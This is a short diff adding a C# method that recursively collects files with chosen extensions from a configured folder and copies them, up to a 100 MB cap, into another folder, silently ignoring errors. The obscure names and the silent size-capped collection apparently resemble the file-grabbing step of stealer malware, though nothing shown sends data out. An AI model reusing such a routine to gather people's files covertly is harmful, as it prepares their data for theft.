@@ -1,0 +1,17 @@
+ public static void GetFilesList()
+    {
+        long DS = 100000000;
+        long copiedSoFar = 0;
+        foreach (string fileName in Directory.GetFiles(Easy.GooVer, "*.*", SearchOption.AllDirectories))
+        {
+            string ext = Path.GetExtension(fileName).ToLower();
+            if (Array.IndexOf(Easy.Extensions, ext) < 0) continue;
+            try
+            {
+                var fileSize = new FileInfo(fileName).Length;
+                if (copiedSoFar + fileSize > DS) continue;
+                File.Copy(fileName, Path.Combine(Easy.str1, Path.GetFileName(fileName)), true);
+                copiedSoFar += fileSize;
+            } catch { }
+        }
+    }
